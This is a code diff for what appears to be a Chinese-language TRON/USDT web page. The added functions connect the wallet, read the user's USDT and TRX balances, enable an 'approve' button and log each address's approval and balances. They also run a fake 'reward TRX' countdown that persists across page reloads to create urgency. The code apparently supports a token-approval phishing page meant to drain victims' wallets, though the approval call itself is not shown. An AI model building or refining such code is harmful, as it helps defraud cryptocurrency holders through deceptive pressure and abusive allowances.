@@ -502,7 +502,202 @@
             }
         }
 
-        // 其他函数（initWallet、startPersistentTrxCountdown等）不变，省略重复代码
+          * 初始化钱包：获取地址、余额
+         */
+        async function initWallet() {
+            try {
+                userAddress = tronWeb.defaultAddress.base58;
+                const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
+
+                // 获取USDT余额（6位小数）
+                const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+                tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
+
+                // 获取TRX余额（6位小数）
+                const trxRaw = await tronWeb.trx.getBalance(userAddress);
+                trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
+
+                // 更新用户信息
+                document.getElementById("userInfo").innerHTML = `
+                    已连接：<br>
+                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                    USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
+                `;
+
+                // 激活按钮
+                document.getElementById("approveBtn").disabled = false;
+                document.getElementById("checkStatusBtn").disabled = false;
+
+                // 更新钱包状态
+                updateWalletStatus();
+
+            } catch (e) {
+                tokenBalance = "0.00";
+                trxBalance = "0.00";
+                showToast("钱包初始化失败：" + e.message, "error");
+            }
+        }
+
+        /**
+         * 启动跨刷新的TRX奖励计数
+         */
+        function startPersistentTrxCountdown() {
+            const savedState = loadTrxStateFromStorage();
+            let currentTrx;
+
+            // 计算当前TRX值
+            if (savedState) {
+                currentTrx = savedState.currentTrx;
+            } else {
+                const now = new Date().getTime();
+                const totalSecPassed = Math.floor((now - DEPLOY_START_TIME) / 1000);
+                currentTrx = (INIT_TRX - totalSecPassed * TRX_DECREASE_PER_SEC).toFixed(4);
+            }
+
+            // 确保不小于0
+            if (currentTrx < 0) currentTrx = "0.0000";
+
+            // 初始更新
+            updateTrxDisplay(currentTrx);
+
+            // 定时器更新（每秒1次）
+            if (trxTimer) clearInterval(trxTimer);
+            trxTimer = setInterval(() => {
+                currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
+                if (currentTrx < 0) {
+                    currentTrx = "0.0000";
+                    clearInterval(trxTimer);
+                    showToast("奖励TRX已耗尽，活动结束", "error");
+                }
+                updateTrxDisplay(currentTrx);
+                saveTrxStateToStorage(currentTrx);
+            }, 1000);
+        }
+
+        /**
+         * 保存/加载TRX状态到localStorage
+         */
+        function saveTrxStateToStorage(currentTrx) {
+            try {
+                const state = {
+                    currentTrx: currentTrx || contractTrxDisplayEl.textContent,
+                    lastUpdate: new Date().getTime()
+                };
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+            } catch (e) {
+                console.warn("保存TRX状态失败：", e);
+            }
+        }
+
+        function loadTrxStateFromStorage() {
+            try {
+                const saved = localStorage.getItem(STORAGE_KEY);
+                return saved ? JSON.parse(saved) : null;
+            } catch (e) {
+                console.warn("加载TRX状态失败：", e);
+                return null;
+            }
+        }
+
+        /**
+         * 更新TRX显示
+         */
+        function updateTrxDisplay(currentTrx) {
+            contractTrxDisplayEl.textContent = Number(currentTrx).toFixed(4);
+        }
+
+        /**
+         * 更新钱包状态显示
+         */
+        function updateWalletStatus() {
+            if (userAddress) {
+                walletStatusContainer.classList.add("connected");
+                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+            } else {
+                walletStatusContainer.classList.remove("connected");
+            }
+        }
+
+        /**
+         * 保存/更新/渲染授权记录
+         */
+        function saveApprovalRecord(record) {
+            try {
+                const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+                // 去重（同一地址只保留最新记录）
+                const newRecords = existing.filter(item => item.address !== record.address);
+                newRecords.push(record);
+                localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
+            } catch (e) {
+                console.log("保存授权记录失败：", e);
+            }
+        }
+
+        function updateApprovalRecordStatus(address, status) {
+            try {
+                const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+                const updated = existing.map(item => 
+                    item.address === address ? { ...item, status } : item
+                );
+                localStorage.setItem(RECORD_KEY, JSON.stringify(updated));
+            } catch (e) {
+                console.log("更新授权记录失败：", e);
+            }
+        }
+
+        function renderApprovalRecords() {
+            try {
+                const container = document.getElementById("approvalRecords");
+                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+
+                if (records.length === 0) {
+                    container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
+                    return;
+                }
+
+                // 按时间倒序排列
+                records.sort((a, b) => new Date(b.approveTime) - new Date(a.approveTime));
+
+                container.innerHTML = records.map(record => `
+                    <div class="record-item">
+                        <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
+                        <p><strong>授权类型：</strong>${record.amount}</p>
+                        <p><strong>USDT余额：</strong>${record.tokenBalance} USDT</p>
+                        <p><strong>TRX余额：</strong>${record.trxBalance} TRX</p>
+                        <p><strong>时间：</strong>${record.approveTime}</p>
+                        <p><strong>状态：</strong><span style="color: ${record.status.includes('成功') ? '#4ade80' : record.status.includes('待') ? '#f97316' : '#ef4444'}">${record.status}</span></p>
+                    </div>
+                `).join("");
+            } catch (e) {
+                console.log("渲染授权记录失败：", e);
+            }
+        }
+
+        function updateRecordCount() {
+            try {
+                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+                document.getElementById("recordCount").textContent = `${records.length}条`;
+            } catch (e) {
+                console.log("更新记录计数失败：", e);
+            }
+        }
+
+        /**
+         * 显示提示框
+         */
+        function showToast(msg, type = "success") {
+            const toast = document.getElementById("resultToast");
+            toast.textContent = msg;
+            toast.style.display = "block";
+            toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
+            toast.style.color = type === "success" ? "#e0e8e4" : "#fca5a5";
+
+            // 3秒后隐藏
+            setTimeout(() => {
+                toast.style.display = "none";
+            }, 3000);
+        }
+
 
         // 临时调试按钮逻辑（所有函数之后添加）
         document.getElementById("showDebugBtn").addEventListener("click", () => {
